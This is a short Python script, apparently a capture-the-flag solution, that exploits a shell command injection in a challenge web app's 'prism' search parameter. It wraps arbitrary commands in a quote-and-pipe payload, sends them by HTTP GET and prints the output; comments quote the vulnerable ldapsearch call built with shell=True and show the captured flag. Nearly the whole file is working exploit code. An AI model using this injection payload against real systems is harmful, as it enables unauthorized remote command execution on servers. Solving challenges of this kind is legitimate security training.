import requests

url = "https://lightweight-3-09bcb7b73b72ca2d.chal.bts.wh.edu.pl/"


def rce(command):
    payload = f"' || {command} || '"
    resp = requests.get(url + "search?prism=" + payload)
    try:
        data = resp.json()["data"]
        return data
    except:
        print(resp.text)
        return None


print(rce("cat entrypoint.sh"))
# echo "BtSCTF{${FLAG_PREFIX}_gl4d_t0_s33_y0u_g0t_output_out_of_th3_comm4nd_1nj3ction}" > /root/flag.txt

# print(rce("cat app.py"))
# cmd = f"ldapsearch -x -H ldap://localhost -b 'ou=prisms,dc=bts,dc=ctf' -D cn=admin,dc=bts,dc=ctf -s sub '(&(objectclass=prismProduct)(cn={prism}))' -w {ADMIN_PASSWORD}"
# process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
# stdout, stderr = process.communicate()

# BtSCTF{_gl4d_t0_s33_y0u_g0t_output_out_of_th3_comm4nd_1nj3ction}
